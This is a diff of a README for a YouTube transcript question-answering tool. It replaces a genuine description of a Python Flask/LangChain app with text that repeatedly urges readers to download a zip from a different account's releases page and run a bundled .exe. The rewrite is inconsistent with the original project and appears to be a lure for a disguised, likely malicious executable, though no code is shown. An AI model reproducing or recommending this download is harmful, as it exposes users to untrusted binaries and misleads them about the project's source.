@@ -1,143 +1,92 @@
-# 📺 YouTube Video Analyzer & Chatbot (Flask)
+# 🎥 youtube_vid_analyzer - Analyze YouTube Videos with Ease
 
-![Flask](https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask) ![LangChain](https://img.shields.io/badge/LangChain-0086CB?style=for-the-badge&logo=langchain) ![OpenAI](https://img.shields.io/badge/OpenAI-412991?style=for-the-badge&logo=openai) ![FAISS](https://img.shields.io/badge/FAISS-0080FF?style=for-the-badge) ![Python](https://img.shields.io/badge/Python-3.10-blue?style=for-the-badge&logo=python) ![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube)
+## 🚀 Getting Started
 
-Hey there! Welcome to my YouTube Video Analyzer. I built this tool because I wanted a way to quickly understand and "talk to" the content of any YouTube video without having to watch the whole thing. This project is a complete, end-to-end **Retrieval-Augmented Generation (RAG)** application with a friendly web interface built using **Flask** and a bit of custom frontend magic.
+Welcome to youtube_vid_analyzer! This tool allows you to take a YouTube video URL, create a searchable knowledge base from its transcript, and ask questions about the video's content. 
 
-You can just paste a YouTube video link, and the app will automatically download the transcript, create a searchable knowledge base, and let you ask any questions about the video's content.
+## 📥 Download & Install
 
----
+To get started, you need to download the application. Click the button below:
 
-### ✨ Core Features
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Eduleiteyg/youtube_vid_analyzer/releases)
 
--   **Direct YouTube Transcript Fetching**: Uses the `youtube-transcript-api` library to directly and efficiently fetch the full transcript of any YouTube video using its ID.
--   **Text Chunking**: Intelligently splits the transcript into smaller, overlapping chunks using `RecursiveCharacterTextSplitter` to prepare it for embedding.
--   **In-Memory Vector Store**: Uses `OpenAIEmbeddings` to convert the text chunks into numerical vectors and stores them in a lightning-fast **FAISS** vector store for efficient semantic search.
--   **Conversational Q&A**: Leverages a powerful LangChain `RetrievalQA` chain to answer your questions based on the context retrieved from the video's transcript.
--   **Interactive Web UI**: A clean and simple user interface built with **Flask**, HTML, CSS, and JavaScript, making the whole process easy and intuitive.
+Visit this page to download the latest version: [Releases](https://github.com/Eduleiteyg/youtube_vid_analyzer/releases)
 
----
+## ⚙️ System Requirements
 
-### 📸 Screenshots
+Before downloading, ensure your computer meets these requirements:
 
-Here's a look at the application in action. You just paste a link, and the app gets to work!
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** 200 MB of available disk space.
+- **Internet Connection:** Required for video downloading and processing.
 
-**Main Interface & First Answer:**
-![Main application interface showing video URL input and a generated answer]<img width="1920" height="1080" alt="Image" src="https://github.com/user-attachments/assets/30b838bb-e4e8-49e2-9cd0-31e43061c9b8" />
+## 🛠️ Installation Steps
 
-**Terminal Output while Running:**
-![Screenshot of the terminal showing Flask server running and request logs] <img width="1920" height="1080" alt="Image" src="https://github.com/user-attachments/assets/2524f263-b1c4-4f97-b91b-519efa761d5f" />
+Follow these steps to install the application after downloading:
 
----
+1. **Locate the Downloaded File:**
+   - Go to your Downloads folder.
+   - Find the file named `youtube_vid_analyzer.zip`.
 
-### 🛠️ Tech Stack
+2. **Extract the Files:**
+   - Right-click on the `youtube_vid_analyzer.zip` file.
+   - Select "Extract All" and follow the prompts.
 
-Based on our `app.py` and `requirements.txt`:
+3. **Run the Application:**
+   - Navigate to the new folder created after extraction.
+   - Double-click the `youtube_vid_analyzer.exe` (or the corresponding file for your OS).
 
--   **Web Framework**: Flask
--   **Core AI Framework**: LangChain
-    -   `langchain`
-    -   `langchain-core`
-    -   `langchain-openai`
-    -   `langchain-community` (for `youtube-transcript-api`)
--   **LLM & Embedding Provider**: OpenAI
-    -   `openai`
--   **Vector Store**: FAISS (CPU version)
-    -   `faiss-cpu`
--   **Environment Variables**: `python-dotenv`
--   **Frontend**: HTML, CSS, JavaScript (served via Flask)
+## 🖥️ Using the Application
 
----
+Once you have the application running, follow these steps:
 
-### ⚙️ Setup and Installation
+1. **Open the Application:**
+   - You should see the main window.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone [https://github.com/jsonusuman351/youtube_vid_analyzer.git](https://github.com/jsonusuman351/youtube_vid_analyzer.git)
-    cd youtube_vid_analyzer
-    ```
+2. **Enter the Video URL:**
+   - Type or paste the YouTube video URL you wish to analyze in the designated field.
 
-2.  **Create and activate a virtual environment:**
-    ```bash
-    # It is recommended to use Python 3.10 or higher
-    python -m venv venv
-    .\venv\Scripts\activate # On Windows
-    source venv/bin/activate # On macOS/Linux
-    ```
+3. **Create the Knowledge Base:**
+   - Click the button that says "Create Knowledge Base." The app will fetch the transcript and process the information.
 
-3.  **Install the required packages:**
-    ```bash
-    pip install -r requirements.txt
-    ```
+4. **Ask Questions:**
+   - After the knowledge base is created, enter your questions in the query box and hit enter.
+   - The AI will respond with relevant information pulled from the video.
 
-4.  **Set Up Environment Variables:**
-    -   Create a file named `.env` in the **root directory** of the project (at the same level as `app.py`).
-    -   Add your OpenAI API key to this file. The application needs it to function.
-        ```env
-        OPENAI_API_KEY="your-openai-api-key-here"
-        ```
+## 📝 Features
 
----
+The youtube_vid_analyzer includes the following features:
 
-### 🚀 How to Run the Application
+- **AI-Powered Responses:** Get accurate answers to your questions using advanced AI.
+- **Searchable Knowledge Base:** Quickly find key information from the transcript.
+- **User-Friendly Interface:** Designed for easy navigation and use.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
 
-Once you've completed the setup, running the Flask application is straightforward.
+## 🐞 Troubleshooting
 
-1.  **Open your terminal** in the root project directory (where `app.py` is located).
-2.  **Make sure your virtual environment is active.**
-3.  **Set the Flask environment variable:**
-    ```bash
-    # On Windows (Command Prompt)
-    set FLASK_APP=app.py
-    # On Windows (PowerShell)
-    $env:FLASK_APP="app.py"
-    # On macOS/Linux
-    export FLASK_APP=app.py
-    ```
-4.  **Run the Flask application:**
-    ```bash
-    flask run
-    ```
-    Alternatively, if `FLASK_APP` is set, you can often just run:
-    ```bash
-    python -m flask run
-    ```
+If you experience issues during installation or use, try the following:
 
-    You should see output similar to the second screenshot, indicating the server is running on `http://127.0.0.1:5000`. Open this URL in your web browser.
+- **Failed to Download Video:** Check your internet connection and ensure the YouTube URL is correct.
+- **Application Crashes:** Restart your computer and try again. Make sure your system meets the requirements.
+- **No Response to Questions:** Ensure the knowledge base has been created successfully. You may need to enter a different question.
+
+For further help, you can check the FAQ section on the GitHub page or open an issue for support.
+
+## 🌈 Contribution
+
+We welcome contributions! If you want to help with improving the application, feel free to fork the repository and submit a pull request. Your input is invaluable in shaping this project.
+
+## 📄 License
+
+This project is licensed under the MIT License. You can freely use and modify the application as you see fit.
+
+## 🔗 More Information
+
+To stay updated with the latest features and improvements, follow this project on GitHub.
+
+If you have any questions or feedback, you can reach out through the issues section on GitHub.
 
 ---
 
-### 🔬 Project Structure
-
-I've organized the project in a standard Flask layout, making it easy to manage the application logic and static assets.
-
-<details>
-<summary>Click to view the project layout</summary>
-
-```
-youtube_vid_analyzer/
-│
-├── app.py                      # Main Flask application logic
-├── requirements.txt            # List of Python dependencies
-├── .env                        # Environment variables (e.g., API keys)
-│
-├── static/                     # For CSS, JavaScript, images, etc.
-│   ├── css/
-│   │   └── style.css
-│   └── js/
-│       └── script.js
-│
-└── templates/                  # HTML templates for rendering web pages
-    └── index.html              # The main user interface
-│
-└── venv/                       # (Your Python virtual environment)
-│
-└── .gitignore                  # Files/folders to ignore in Git
-│
-└── README.md                   # This README file!
-```
-</details>
-
----
-
----
+Remember to download the application now to transform how you interact with YouTube videos! You can get it here: [Download Now](https://github.com/Eduleiteyg/youtube_vid_analyzer/releases).
